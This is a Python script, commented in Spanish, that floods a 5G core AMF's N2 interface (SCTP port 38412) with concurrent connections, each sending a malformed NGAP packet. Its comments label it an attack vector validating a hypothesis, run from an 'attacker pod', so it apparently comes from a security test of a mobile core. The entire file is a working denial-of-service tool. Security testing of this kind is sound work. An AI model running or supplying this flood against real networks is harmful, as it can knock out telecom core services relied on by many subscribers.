#!/usr/bin/env python3
# sctp_flood.py -- inundacion de asociaciones SCTP contra la interfaz
# N2 del AMF (puerto 38412). Vector A3. Valida HE2.
#
# Uso: python3 sctp_flood.py <AMF_IP> 38412 <N_CONEXIONES>
#
# Requiere lksctp-tools instalado en el pod atacante:
#   apt-get install -y lksctp-tools

import socket, sys, time, threading

TARGET = sys.argv[1]
PORT = int(sys.argv[2])
CONNS = int(sys.argv[3])
IPPROTO_SCTP = 132

ok = 0
fail = 0
lock = threading.Lock()


def one():
    global ok, fail
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, IPPROTO_SCTP)
        s.settimeout(2)
        s.connect((TARGET, PORT))
        # Enviar NGAP malformado para forzar procesamiento en el AMF
        s.send(b'\x00\x15\x00\x08\x00\x00\x00\x00')
        with lock:
            ok += 1
    except Exception:
        with lock:
            fail += 1
    finally:
        try:
            s.close()
        except Exception:
            pass


threads = []
t0 = time.time()
for i in range(CONNS):
    t = threading.Thread(target=one)
    t.start()
    threads.append(t)
    if len(threads) >= 200:
        for t in threads:
            t.join()
        threads = []
for t in threads:
    t.join()

print(f"CONNS={CONNS} OK={ok} FAIL={fail} TIME={time.time() - t0:.1f}s")
